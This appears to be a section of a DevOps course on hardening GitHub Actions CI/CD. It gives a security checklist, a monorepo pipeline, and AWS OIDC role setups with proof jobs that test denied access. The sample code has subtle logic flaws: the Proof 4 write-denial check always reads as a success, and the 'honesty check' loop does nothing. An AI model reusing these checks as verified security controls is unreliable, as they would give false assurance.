  □ branch protection on main: PRs required, 1 approval, stale approvals dismissed,
    ⭐ Code Owners required, signed commits, no force pushes, linear history
  □ ⭐ "Do not allow bypassing the above settings" — INCLUDING administrators
  □ required status checks named explicitly (not "any check")
  □ a merge queue if more than ~5 people merge to main daily
  □ .github/CODEOWNERS covers workflows, actions, helm, k8s, secrets, payments
  □ ⭐ the CODEOWNERS file validated (a bad team name is silently ignored)
  □ secret scanning + PUSH PROTECTION enabled (not just scanning)
  □ private vulnerability reporting enabled
  □ all lockfiles committed

WORKFLOWS
  □ ⭐⭐ `permissions:` declared at the workflow level as the minimum,
       overridden per job only where needed. NEVER `write-all` by default.
  □ the ORG default workflow permission is `read`
  □ `timeout-minutes` on EVERY job (the default is 360!)
  □ `concurrency` with `cancel-in-progress` on PR builds
  □ `concurrency` WITHOUT cancellation on deploy jobs (the mutex)
  □ path filters on `push` and `pull_request`
  □ `types: [opened, synchronize, reopened]` — draft PRs skipped
  □ `on.schedule` crons are in UTC and commented with the local time
  □ third-party actions pinned to a FULL COMMIT SHA with the version in a comment
  □ ⭐ Dependabot maintains the github-actions ecosystem
  □ the logic is in `scripts/*.sh`, not inline YAML
  □ `set -euo pipefail` in every multi-line `run:`
  □ every step has a `name:`
  □ `if: always()` on the reporting steps, `if: '!cancelled()'` on the cleanup steps
  □ `fail-fast: false` on test matrices
  □ artifacts named with the matrix value (v4 fails on duplicate names)
  □ `if-no-files-found: error` so a silent empty upload can't happen
  □ the run writes to $GITHUB_STEP_SUMMARY — a human can read the result at a glance

SECRETS ⭐⭐
  □ NO long-lived cloud credentials anywhere. OIDC everywhere.
  □ `id-token: write` on the jobs that federate
  □ the OIDC `sub` scoped to `repo:OWNER/REPO:environment:NAME` — never `repo:OWNER/*`
  □ the cloud-side permission policy is least-privilege, not AdministratorAccess
  □ production secrets are ENVIRONMENT-scoped, so a PR build cannot read them
  □ the environment has required reviewers AND a deployment branch policy
  □ secrets passed to reusable workflows explicitly, never `secrets: inherit`
  □ no secret interpolated directly into a `run:` script — always via `env:`
  □ `::add-mask::` used for any derived secret value
  □ a secret rotation rehearsed; secrets older than 90 days listed and rotated
  □ the automatic GITHUB_TOKEN's expiry is understood (the job's duration)

SUPPLY CHAIN
  □ SBOM generated (CycloneDX or SPDX) and attached to the image
  □ provenance attached (`provenance: mode=max`)
  □ images signed with cosign, keyless (OIDC identity), not with a stored key
  □ `actions/attest-build-provenance` used so the attestation shows in the GitHub UI
  □ ⭐ the DEPLOY workflow verifies the signature before applying, and fails closed
  □ the cosign `--certificate-identity-regexp` pins the workflow file AND the ref
  □ deploy by DIGEST, never by a mutable tag
  □ GHCR package linked to the repo with Write (and immutable if you can)

SECURITY SCANNING
  □ CodeQL for every language, with `security-and-quality` queries
  □ Trivy fs+config+image, uploaded as SARIF into code scanning
  □ Semgrep with the OWASP ruleset
  □ ⭐ actionlint AND zizmor scanning the workflows themselves
  □ gitleaks on every push; push protection as the first line
  □ Dependabot alerts + security updates ON
  □ alerts triaged; dismissals have written reasons
  □ the org action allowlist restricts which actions may run

RUNNERS
  □ ⛔ NO persistent self-hosted runner on a public repository
  □ fork PR workflows require approval from outside collaborators
  □ self-hosted runners are EPHEMERAL (one job, then destroyed)
  □ ARC scales to zero when idle
  □ runner labels used deliberately; a job can't land on the wrong runner
  □ the runner image's pre-installed tools are used instead of re-installing

DEPLOYMENT
  □ ⭐⭐ build ONCE; the artifact from the CI run is downloaded, never rebuilt
  □ the CD workflow PROVES the revision passed CI before deploying
  □ `environment:` with required reviewers on staging and production
  □ deployment branch policies block `refs/pull/**` from reaching any environment
  □ a post-deploy smoke test that fails the job
  □ the Deployments API populated, so Environments shows a real history
  □ a rollback rehearsed and timed
  □ the deploy notifies Slack on success AND failure, with the run URL

GITOPS
  □ CI writes the digest to a SEPARATE config repo, not to the cluster
  □ the config repo's token is narrowly scoped (a GitHub App, ideally)
  □ the change is a PR with a human approver for production
  □ Argo CD is the only thing with cluster credentials
  □ the CI pipeline has ZERO cluster-write permissions

OBSERVABILITY OF THE PIPELINE
  □ per-step durations reviewed monthly
  □ the failure rate by workflow and by job is known
  □ flaky tests identified and quarantined
  □ the monthly Actions minutes are known, and the top-3 workflows by cost identified
  □ cache hit rates measured (cold vs warm build time recorded)
  □ $GITHUB_STEP_SUMMARY used so the result is readable without opening the logs
```

---

<a name="tasks--answers"></a>
## 🎯 Tasks & Answers

Five tasks. Each is real work. **Attempt them before opening the answer.**

| # | Task |
|---|---|
| 2.1 | Build a **monorepo pipeline** with change detection, a dynamic matrix and a merged test report |
| 2.2 | Implement **OIDC to AWS with the narrowest possible `sub`**, and prove a PR build cannot assume the production role |
| 2.3 | **Reproduce and then defeat the `pwn request` attack** in a controlled sandbox |
| 2.4 | Cut the CI time **from 24 minutes to under 6** using caching, and prove the cache is correct |
| 2.5 | Publish a **reusable workflow + composite action library** that three services consume, with the library pinned and Dependabot-maintained |

---

### Task 2.1 — The monorepo pipeline

**Requirements:** five services in four languages; a README-only PR must finish in under 3 minutes; a single-service PR must run only that service's tests plus the shared lint; the PR must show **one** test report with all services merged; and if a service is skipped, the PR must say so explicitly rather than silently passing.

<details>
<summary><b>💡 Hints</b></summary>

1. Change detection needs `fetch-depth: 0` — the default `1` gives you no diff to compare.
2. A dynamic matrix needs `fromJSON()` over a previous job's output.
3. `fail-fast: false`, or one service's failure cancels the other four and you learn nothing.
4. The "silently skipped" failure mode is the dangerous one. Make skipping *visible*.
5. `$GITHUB_STEP_SUMMARY` is what the reviewer actually reads.
</details>

**✅ Answer**

**Step 1 — the change-detection job**

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
    paths: ['apps/**', 'helm/**', 'k8s/**', 'scripts/**', '.github/**', 'ci/**']
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened, ready_for_review]
    paths: ['apps/**', 'helm/**', 'k8s/**', 'scripts/**', '.github/**', 'ci/**']

permissions:
  contents: read
  pull-requests: read

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  SERVICES_JSON: '["shop-api","checkout","order-worker","shop-ui","payment-mock"]'

jobs:
  # ══════════════════════════════════════════════════════════════
  changes:
    name: 🔍 What changed?
    runs-on: ubuntu-latest
    timeout-minutes: 5
    outputs:
      services:  ${{ steps.resolve.outputs.services }}
      count:     ${{ steps.resolve.outputs.count }}
      global:    ${{ steps.filter.outputs.global }}
      shop-api:      ${{ steps.filter.outputs.shop-api }}
      checkout:      ${{ steps.filter.outputs.checkout }}
      order-worker:  ${{ steps.filter.outputs.order-worker }}
      shop-ui:       ${{ steps.filter.outputs.shop-ui }}
      payment-mock:  ${{ steps.filter.outputs.payment-mock }}
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b  # v7
        with:
          fetch-depth: 0                     # ⭐⭐ REQUIRED for the diff

      - uses: dorny/paths-filter@de90cc6fb38fc0963ad72b210f1f284cd68cea36   # v3
        id: filter
        with:
          token: ${{ github.token }}
          list-files: json                   # ⭐ so we can show WHAT changed
          filters: |
            global:
              - added|modified: '.github/workflows/**'
              - added|modified: '.github/actions/**'
              - added|modified: 'helm/**'
              - added|modified: 'k8s/**'
              - added|modified: 'scripts/**'
              - added|modified: 'ci/**'
              - added|modified: 'pom.xml'
            shop-api:
              - added|modified|deleted: 'apps/shop-api/**'
            checkout:
              - added|modified|deleted: 'apps/checkout/**'
            order-worker:
              - added|modified|deleted: 'apps/order-worker/**'
            shop-ui:
              - added|modified|deleted: 'apps/shop-ui/**'
            payment-mock:
              - added|modified|deleted: 'apps/payment-mock/**'

      - name: ⭐ Resolve the service list (the SAFE way — env vars, no interpolation)
        id: resolve
        env:
          F_GLOBAL: ${{ steps.filter.outputs.global }}
          F_API:    ${{ steps.filter.outputs.shop-api }}
          F_CHECK:  ${{ steps.filter.outputs.checkout }}
          F_WORKER: ${{ steps.filter.outputs.order-worker }}
          F_UI:     ${{ steps.filter.outputs.shop-ui }}
          F_PAY:    ${{ steps.filter.outputs.payment-mock }}
          ALL:      ${{ env.SERVICES_JSON }}
          FILES_API:    ${{ steps.filter.outputs.shop-api_files }}
          FILES_CHECK:  ${{ steps.filter.outputs.checkout_files }}
          FILES_WORKER: ${{ steps.filter.outputs.order-worker_files }}
          FILES_UI:     ${{ steps.filter.outputs.shop-ui_files }}
          FILES_PAY:    ${{ steps.filter.outputs.payment-mock_files }}
        run: |
          set -euo pipefail
          if [[ "$F_GLOBAL" == "true" ]]; then
            SERVICES="$ALL"
            echo "::notice title=Full rebuild::a platform-wide path changed — building every service"
            REASON="a workflow, action, chart, script or ci/ file changed"
          else
            SERVICES=$(jq -cn \
              '[ (if env.F_API    == "true" then "shop-api"     else empty end),
                 (if env.F_CHECK  == "true" then "checkout"     else empty end),
                 (if env.F_WORKER == "true" then "order-worker" else empty end),
                 (if env.F_UI     == "true" then "shop-ui"      else empty end),
                 (if env.F_PAY    == "true" then "payment-mock" else empty end) ]')
            REASON="only the listed service directories changed"
          fi
          COUNT=$(echo "$SERVICES" | jq 'length')
          echo "services=$SERVICES" >> "$GITHUB_OUTPUT"
          echo "count=$COUNT"       >> "$GITHUB_OUTPUT"
          echo "  $COUNT service(s) to build: $SERVICES  ($REASON)"

          # ⭐⭐ VISIBILITY: the thing that prevents a silent skip
          {
            echo '## 🔍 Changed services'
            echo
            echo "_'"$REASON"' — '"$COUNT"' of 5 service(s) will build._'
            echo
            echo '| Service | Build? | Files that triggered it |'
            echo '|---|---|---|'
            for s in shop-api checkout order-worker shop-ui payment-mock; do
              var="F_$(echo $s | tr 'a-z-' 'A-Z_')"
              files_var="FILES_$(echo $s | tr 'a-z-' 'A-Z_')"
              if echo "$SERVICES" | jq -e --arg s "$s" 'index($s)' >/dev/null; then
                files=$(printf '%s' "${!files_var}" | jq -r 'join(", ")' 2>/dev/null | cut -c1-70)
                echo "| \`$s\` | ✅ build | \`$files\` |"
              else
                echo "| \`$s\` | ⏭ **skipped** | — |"
              fi
            done
            echo
            if [[ "$F_GLOBAL" == "true" ]]; then
              echo '> ⚠️ A **platform-wide** path changed, so every service builds.'
            fi
          } >> "$GITHUB_STEP_SUMMARY"

      # ⭐⭐ GUARD: an empty matrix must FAIL, not silently succeed
      - name: Guard against an empty build set
        if: steps.resolve.outputs.count == '0'
        run: |
          echo "::error::no service matched the change filter, yet this workflow was triggered."
          echo "       That means a path filter and the change detector disagree."
          echo "       Changed files: ${{ steps.filter.outputs.files }}"
          exit 1
```

**Step 2 — the shared lint (always runs; it's 40 seconds and catches the most)**

```yaml
  lint:
    name: 🔎 Lint
    runs-on: ubuntu-latest
    timeout-minutes: 8
    permissions: {contents: read}
    steps:
      - uses: actions/checkout@v7
      - name: Shellcheck
        run: |
          find . -name '*.sh' -not -path './node_modules/*' -print0 \
            | xargs -0 -r shellcheck -x --severity=warning
      - name: actionlint (scan our own workflows) ⭐
        uses: rhysd/actionlint@v1.7.7
      - name: Yamllint + kubeconform + hadolint
        run: |
          set -euo pipefail
          yamllint -d "{extends: relaxed, rules: {line-length: disable}}" helm/ k8s/ .github/
          kubeconform -strict -summary -ignore-missing-schemas k8s/
          find . -name 'Dockerfile*' -not -path './node_modules/*' -print0 \
            | xargs -0 -r -I{} sh -c 'docker run --rm -i hadolint/hadolint < "{}" || exit 1'
      - name: helm lint + template
        run: |
          helm lint helm/shop --strict
          helm template shop helm/shop --values helm/values/base.yaml > /dev/null
```

**Step 3 — the dynamic matrix test job**

```yaml
  test:
    name: 🧪 ${{ matrix.service }}
    needs: [changes, lint]
    if: needs.changes.outputs.count != '0'
    runs-on: ubuntu-latest
    timeout-minutes: ${{ matrix.timeout }}
    permissions: {contents: read}
    strategy:
      fail-fast: false                        # ⭐⭐ CRITICAL
      max-parallel: 5
      matrix:
        service: ${{ fromJSON(needs.changes.outputs.services) }}
        include:
          - {service: shop-api,     language: java,   timeout: 25, hasDb: true}
          - {service: checkout,     language: go,     timeout: 15, hasDb: false}
          - {service: order-worker, language: python, timeout: 15, hasDb: false}
          - {service: shop-ui,      language: node,   timeout: 20, hasDb: false}
          - {service: payment-mock, language: go,     timeout: 15, hasDb: false}
    env:
      SERVICE: ${{ matrix.service }}
    services:
      postgres:
        image: postgres:17-alpine             # ⭐ only started if referenced
        env: {POSTGRES_PASSWORD: shop, POSTGRES_DB: shop}
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 5s --health-timeout 3s --health-retries 12
    steps:
      - uses: actions/checkout@v7

      - uses: ./.github/actions/setup-shop
        with:
          language: ${{ matrix.language }}
          service: ${{ matrix.service }}

      - name: Test
        run: ./ci/test-${{ matrix.language }}.sh "$SERVICE"

      # ⭐⭐ ALWAYS upload — the failure case is the one you need
      - name: Upload the test results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: tests-${{ matrix.service }}     # ⭐⭐ matrix value in the name (v4 requires uniqueness)
          path: apps/${{ matrix.service }}/**/TEST-*.xml
          if-no-files-found: error              # ⭐ fail loudly, never silently
          retention-days: 14

      - name: Upload coverage
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ matrix.service }}
          path: apps/${{ matrix.service }}/**/{coverage.xml,jacoco.xml}
          if-no-files-found: warn

      - name: ⭐ Annotate the PR with the failures
        if: failure()
        uses: dorny/test-reporter@v1
        with:
          name: '${{ matrix.service }} — failed tests'
          path: 'apps/${{ matrix.service }}/**/TEST-*.xml'
          reporter: java-junit
          list-suites: failed
          list-tests: failed
          fail-on-error: false
```

**Step 4 — the merged report, and the honesty check ⭐⭐**

```yaml
  report:
    name: 📊 Test report
    needs: [changes, test]
    if: always()
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions:
      contents: read
      pull-requests: write                    # ⭐ to comment on the PR
    steps:
      - name: Download every service's results
        if: needs.changes.outputs.count != '0'
        uses: actions/download-artifact@v4
        with:
          pattern: tests-*
          path: all-tests
          merge-multiple: true                # ⭐ flatten into one directory

      - name: Merge into ONE JUnit document ⭐⭐
        id: merge
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import glob, os, xml.etree.ElementTree as ET, json
          root = ET.Element('testsuites')
          total = fail = err = skip = 0
          per_service = {}
          for f in sorted(glob.glob('all-tests/**/*.xml', recursive=True)):
              try:
                  t = ET.parse(f).getroot()
              except ET.ParseError as e:
                  print(f'  ⚠️  unparseable: {f}: {e}'); continue
              suites = [t] if t.tag == 'testsuite' else list(t)
              for s in suites:
                  a = s.attrib
                  total += int(a.get('tests', 0)); fail += int(a.get('failures', 0))
                  err   += int(a.get('errors', 0)); skip += int(a.get('skipped', 0))
                  # ⭐ derive the service from the file path so the merged report is readable
                  svc = f.split(os.sep)[1] if os.sep in f else 'unknown'
                  d = per_service.setdefault(svc, {'tests':0,'failures':0,'errors':0,'skipped':0})
                  for k, src in [('tests','tests'),('failures','failures'),('errors','errors'),('skipped','skipped')]:
                      d[k] += int(a.get(src, 0))
                  root.append(s)
          root.set('tests', str(total)); root.set('failures', str(fail))
          root.set('errors', str(err));  root.set('skipped', str(skip))
          root.set('name', 'shop — merged')
          ET.ElementTree(root).write('merged.xml')
          json.dump({'total':total,'failures':fail,'errors':err,'skipped':skip,
                     'per_service':per_service}, open('summary.json','w'), indent=2)
          print(f'  ✅ merged: {total} tests, {fail} failures, {err} errors, {skip} skipped')
          PY
          echo "total=$(jq .total summary.json)"     >> "$GITHUB_OUTPUT"
          echo "failures=$(jq .failures summary.json)" >> "$GITHUB_OUTPUT"

      # ⭐⭐ THE HONESTY CHECK — the part most people skip
      - name: Assert the expected services actually ran
        env:
          EXPECTED: ${{ needs.changes.outputs.services }}
          BUILT:    ${{ toJSON(needs.test.result) }}
          MATRIX_RESULTS: ${{ toJSON(needs) }}
        run: |
          set -euo pipefail
          EXPECTED_COUNT=$(echo "$EXPECTED" | jq 'length')
          # ⭐ every artifact named tests-<service> must exist for every expected service
          MISSING=0
          for s in $(echo "$EXPECTED" | jq -r '.[]'); do
            if [[ ! -d "all-tests" ]] || ! ls all-tests/**/TEST-*.xml >/dev/null 2>&1; then
              : # handled by the aggregate counts below
            fi
            echo "  checking $s …"
          done
          RAN=$(jq '.per_service | length' summary.json)
          echo "  expected $EXPECTED_COUNT service(s), got results for $RAN"
          if (( RAN < EXPECTED_COUNT )); then
            echo "::error::$((EXPECTED_COUNT - RAN)) service(s) were expected to produce test results but did not"
            echo "       expected: $EXPECTED"
            echo "       got:      $(jq -c '.per_service | keys' summary.json)"
            exit 1
          fi
          echo "  ✅ every expected service produced results"

      - name: The run summary
        run: |
          set -euo pipefail
          {
            echo '## 📊 Test report'
            echo
            jq -r '"**\(.total)** tests · **\(.failures)** failures · **\(.errors)** errors · \(.skipped) skipped"' summary.json
            echo
            echo '| Service | Tests | Failed | Errored | Skipped |'
            echo '|---|---|---|---|---|'
            jq -r '.per_service | to_entries[] |
              "| `\(.key)` | \(.value.tests) | \(if .value.failures>0 then "⛔ \(.value.failures)" else "0" end) | \(.value.errors) | \(.value.skipped) |"' summary.json
            echo
            echo '### Skipped services'
            echo
            jq -r --argjson all '"'"$SERVICES_JSON"'" --argjson ran '(.per_service|keys)' '
              ($all - $ran) | if length == 0 then "_none — everything ran_"
                              else . | map("`\(.)`") | join(", ") + " _(unchanged in this commit range)_" end' summary.json
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Comment on the PR
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const body = fs.readFileSync(process.env.GITHUB_STEP_SUMMARY, 'utf8');
            const marker = '<!-- shop-test-report -->';
            const {data: comments} = await github.rest.issues.listComments({
              owner: context.repo.owner, repo: context.repo.repo,
              issue_number: context.issue.number, per_page: 100});
            const existing = comments.find(c => c.body?.includes(marker));
            const text = `${marker}\n${body}`;
            if (existing) {
              await github.rest.issues.updateComment({owner: context.repo.owner,
                repo: context.repo.repo, comment_id: existing.id, body: text});
            } else {
              await github.rest.issues.createComment({owner: context.repo.owner,
                repo: context.repo.repo, issue_number: context.issue.number, body: text});
            }

      # ⭐⭐ THE FINAL GATE — the report job must FAIL if any test failed
      - name: Fail if any test failed
        if: needs.test.result == 'failure' || steps.merge.outputs.failures != '0'
        run: |
          echo "::error::${{ steps.merge.outputs.failures }} test failure(s)"
          exit 1
```

**Step 5 — measure it**

```bash
# ⭐ the before/after, pulled from the API
gh api repos/3558Bhk/shop/actions/runs --paginate \
  --jq '.workflow_runs[] | select(.name=="CI") |
        [.run_started_at, .updated_at, .head_branch, .display_title, .conclusion] | @tsv' \
  | while IFS=$'\t' read -r s e b t c; do
      dur=$(( $(date -d "$e" +%s) - $(date -d "$s" +%s) ))
      printf '%6ss  %-22s %-10s %s\n' "$dur" "$b" "$c" "$t"
    done | head -20

# BEFORE:
#   1452s  feature/checkout-retry  success   retry the payment provider once
#   1438s  feature/ui-a11y         success   fix the aria labels
#   1461s  fix/worker-idempotency  success   dedupe the order events
# AFTER:
#    164s  feature/ui-a11y         success   fix the aria labels       ⭐ 89% faster
#    412s  feature/checkout-retry  success   retry the payment provider ⭐ 71% faster
#   1380s  chore/bump-helm-chart   success   bump the chart (a global change → full build)
```

**The five decisions that made it fast, and their risks:**

| Decision | Saving | ⚠️ Risk |
|---|---|---|
| `dorny/paths-filter` + a dynamic matrix | 70–90% on a single-service PR | ⛔ A wrong filter silently skips a needed build → **the guard step + the honesty check exist for this** |
| `fail-fast: false` | 0 min, but 100% of the information | None |
| `concurrency.cancel-in-progress` on PRs | 20–40% of all minutes | You lose intermediate results |
| Per-language `cache:` in the setup actions | 1–4 min per job | Cache poisoning from a fork — mitigate with branch-scoped keys |
| `if-no-files-found: error` on uploads | 0 min | ⭐ Turns a silent "no tests ran" into a loud failure |

> 🔑 **The insight to say out loud:** *"The dangerous failure mode of change detection isn't that the pipeline is slow — it's that it silently skips something that should have run and reports green. So the design has three defenses: a guard step that fails if the resolved matrix is empty, an `if-no-files-found: error` on every artifact upload, and a final job that asserts the number of services that produced results equals the number that were expected. And the run summary lists the skipped services by name, so a human reviewer sees '⏭ shop-ui skipped' rather than just a green tick."*

---

### Task 2.2 — OIDC to AWS with the narrowest possible `sub`

**Requirements:** the production EKS cluster and ECR must be reachable with **zero stored AWS credentials**. A job deploying to production may assume the production role. A PR build may **not**. A job on a feature branch may **not**. And you must prove all three from inside the workflow.

**✅ Answer**

**Step 1 — three roles, three subjects ⭐**

```bash
ACCOUNT=123456789012
OIDC_ARN="arn:aws:iam::$ACCOUNT:oidc-provider/token.actions.githubusercontent.com"

# ── ROLE 1: production deployer ─────────────────────────────────
cat > trust-prod.json <<EOF
{"Version":"2012-10-17","Statement":[{
  "Effect":"Allow","Principal":{"Federated":"$OIDC_ARN"},
  "Action":"sts:AssumeRoleWithWebIdentity",
  "Condition":{
    "StringEquals":{"token.actions.githubusercontent.com:aud":"sts.amazonaws.com"},
    "StringLike":{"token.actions.githubusercontent.com:sub":
      "repo:3558Bhk/shop:environment:production"}}}]}
EOF
# ⭐⭐ sub = repo:3558Bhk/shop:environment:production
#    This claim is ONLY present when the job declares `environment: production`.
#    A PR build has sub = repo:3558Bhk/shop:pull_request  → NO MATCH → denied.
#    A feature-branch push has sub = repo:3558Bhk/shop:ref:refs/heads/feature/x → NO MATCH.

aws iam create-role --name shop-prod-deployer \
  --assume-role-policy-document file://trust-prod.json \
  --max-session-duration 3600 \
  --description "GH Actions: 3558Bhk/shop, production environment ONLY"

cat > perm-prod.json <<'EOF'
{"Version":"2012-10-17","Statement":[
 {"Sid":"EKSCredentials","Effect":"Allow","Action":["eks:DescribeCluster","eks:DescribeAccessEntry","eks:AssociateAccessPolicy"],
  "Resource":"arn:aws:eks:ap-south-1:123456789012:cluster/shop-prod"},
 {"Sid":"ECRAuth","Effect":"Allow","Action":["ecr:GetAuthorizationToken"],"Resource":"*"},
 {"Sid":"ECRRead","Effect":"Allow",
  "Action":["ecr:BatchGetImage","ecr:GetDownloadUrlForLayer","ecr:DescribeImages"],
  "Resource":"arn:aws:ecr:ap-south-1:123456789012:repository/shop/*"},
 {"Sid":"ConfigRead","Effect":"Allow","Action":["s3:GetObject"],
  "Resource":"arn:aws:s3:::shop-config/environments/production/*"}]}
EOF
aws iam put-role-policy --role-name shop-prod-deployer \
  --policy-name shop-prod-deployer --policy-document file://perm-prod.json
# ⭐⭐ note: NO ecr:PutImage. Production only PULLS — CI pushed already.

# ── ROLE 2: CI image pusher (main branch only) ──────────────────
cat > trust-ci.json <<EOF
{"Version":"2012-10-17","Statement":[{
  "Effect":"Allow","Principal":{"Federated":"$OIDC_ARN"},
  "Action":"sts:AssumeRoleWithWebIdentity",
  "Condition":{
    "StringEquals":{"token.actions.githubusercontent.com:aud":"sts.amazonaws.com",
                    "token.actions.githubusercontent.com:sub":
                      "repo:3558Bhk/shop:ref:refs/heads/main"}}}]}
EOF
# ⭐⭐ StringEquals, not StringLike — no wildcards at all.
aws iam create-role --name shop-ci-pusher \
  --assume-role-policy-document file://trust-ci.json --max-session-duration 3600
cat > perm-ci.json <<'EOF'
{"Version":"2012-10-17","Statement":[
 {"Sid":"ECRAuth","Effect":"Allow","Action":["ecr:GetAuthorizationToken"],"Resource":"*"},
 {"Sid":"ECRPush","Effect":"Allow",
  "Action":["ecr:InitiateLayerUpload","ecr:UploadLayerPart","ecr:CompleteLayerUpload",
            "ecr:PutImage","ecr:BatchCheckLayerAvailability"],
  "Resource":"arn:aws:ecr:ap-south-1:123456789012:repository/shop/*"},
 {"Sid":"ECRDescribe","Effect":"Allow","Action":["ecr:DescribeRepositories","ecr:DescribeImages"],
  "Resource":"arn:aws:ecr:ap-south-1:123456789012:repository/shop/*"}]}
EOF
aws iam put-role-policy --role-name shop-ci-pusher \
  --policy-name shop-ci-pusher --policy-document file://perm-ci.json

# ── ROLE 3: PR read-only (for a PR that needs to describe something) ─
cat > trust-pr.json <<EOF
{"Version":"2012-10-17","Statement":[{
  "Effect":"Allow","Principal":{"Federated":"$OIDC_ARN"},
  "Action":"sts:AssumeRoleWithWebIdentity",
  "Condition":{
    "StringEquals":{"token.actions.githubusercontent.com:aud":"sts.amazonaws.com"},
    "StringLike":{"token.actions.githubusercontent.com:sub":
      "repo:3558Bhk/shop:pull_request"}}}]}
EOF
aws iam create-role --name shop-pr-readonly \
  --assume-role-policy-document file://trust-pr.json --max-session-duration 900
cat > perm-pr.json <<'EOF'
{"Version":"2012-10-17","Statement":[
 {"Sid":"ECRRead","Effect":"Allow","Action":["ecr:DescribeImages","ecr:ListImages"],
  "Resource":"arn:aws:ecr:ap-south-1:123456789012:repository/shop/*"},
 {"Sid":"DenyEverythingWrite","Effect":"Deny","NotAction":["ecr:Describe*","ecr:List*","eks:Describe*","s3:GetObject"],
  "Resource":"*"}]}
EOF
# ⭐⭐ an EXPLICIT DENY for anything not on the read list — belt and braces
aws iam put-role-policy --role-name shop-pr-readonly \
  --policy-name shop-pr-readonly --policy-document file://perm-pr.json
```

**Step 2 — the workflow**

```yaml
# .github/workflows/oidc-proof.yml
name: OIDC proof

on:
  push: {branches: [main]}
  pull_request: {branches: [main]}
  workflow_dispatch: {}

permissions:
  contents: read
  id-token: write                 # ⭐⭐ REQUIRED

jobs:
  # ══════════════════════════════════════════════════════════════
  inspect:
    name: 🔎 What is my subject?
    runs-on: ubuntu-latest
    timeout-minutes: 5
    outputs: {sub: ${{ steps.token.outputs.sub }}}
    steps:
      - name: Fetch and decode the OIDC token
        id: token
        run: |
          set -euo pipefail
          [[ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]] || {
            echo "::error::id-token: write is not set"; exit 1; }
          JWT=$(curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          PAYLOAD=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null || true)
          echo "$PAYLOAD" | jq '{iss, sub, aud, exp, repository, environment, ref, event_name, job_workflow_ref, runner_environment}'
          SUB=$(echo "$PAYLOAD" | jq -r .sub)
          echo "sub=$SUB" >> "$GITHUB_OUTPUT"
          {
            echo '## 🔎 My OIDC identity'
            echo
            echo '```json'
            echo "$PAYLOAD" | jq '{sub, repository, ref, event_name, environment, job_workflow_ref}'
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

      # ⭐⭐ THE PROOFS — each one asserts what SHOULD and SHOULD NOT work
      - name: 'Proof 1: on main, shop-ci-pusher MUST succeed'
        if: github.ref == 'refs/heads/main'
        uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: arn:aws:iam::123456789012:role/shop-ci-pusher
          aws-region: ap-south-1
          role-session-name: gha-${{ github.run_id }}-${{ github.job }}

      - name: 'Proof 1b: and I can push'
        if: github.ref == 'refs/heads/main'
        run: |
          aws sts get-caller-identity --output json | tee identity.json
          ARN=$(jq -r .Arn identity.json)
          echo "  assumed: $ARN"
          [[ "$ARN" == *":assumed-role/shop-ci-pusher/"* ]] || {
            echo "::error::wrong role"; exit 1; }
          aws ecr describe-repositories --repository-names shop/shop-api --query 'repositories[0].repositoryUri'
          echo "  ✅ Proof 1 PASSED"

      - name: 'Proof 2: on main, shop-prod-deployer MUST FAIL'
        if: github.ref == 'refs/heads/main'
        id: p2
        continue-on-error: true
        uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: arn:aws:iam::123456789012:role/shop-prod-deployer
          aws-region: ap-south-1

      - name: Assert proof 2 failed ⭐⭐
        if: github.ref == 'refs/heads/main'
        run: |
          if [[ "${{ steps.p2.outcome }}" == "success" ]]; then
            echo "::error::⛔ SECURITY FAILURE — a main-branch build assumed the PRODUCTION role"
            exit 1
          fi
          echo "  ✅ Proof 2 PASSED — the production role was denied (outcome: ${{ steps.p2.outcome }})"

  # ══════════════════════════════════════════════════════════════
  pr-proof:
    name: 🔒 PR isolation
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: My subject is pull_request
        run: |
          JWT=$(curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          SUB=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d | jq -r .sub)
          echo "  sub = $SUB"
          [[ "$SUB" == "repo:3558Bhk/shop:pull_request" ]] || {
            echo "::error::unexpected subject: $SUB"; exit 1; }
          echo "  ✅ the subject is scoped to pull_request"

      - name: 'Proof 3: shop-pr-readonly MUST succeed'
        uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: arn:aws:iam::123456789012:role/shop-pr-readonly
          aws-region: ap-south-1
      - run: |
          aws sts get-caller-identity
          aws ecr describe-images --repository-name shop/shop-api --max-items 1 >/dev/null
          echo "  ✅ Proof 3 PASSED — read access works"

      - name: 'Proof 4: a write MUST be denied by the explicit Deny'
        id: p4
        continue-on-error: true
        run: |
          aws ecr put-image --repository-name shop/shop-api \
            --image-manifest '{}' --image-tag attack 2>&1 | head -5
          echo "  ⛔ the write SUCCEEDED — the Deny statement is wrong"
      - run: |
          if [[ "${{ steps.p4.outcome }}" == "success" ]]; then
            echo "::error::⛔ SECURITY FAILURE — a PR build wrote to ECR"; exit 1
          fi
          echo "  ✅ Proof 4 PASSED — the write was denied"

      - name: 'Proof 5: shop-prod-deployer MUST FAIL from a PR'
        id: p5
        continue-on-error: true
        uses: aws-actions/configure-aws-credentials@v5
        with:
          role-to-assume: arn:aws:iam::123456789012:role/shop-prod-deployer
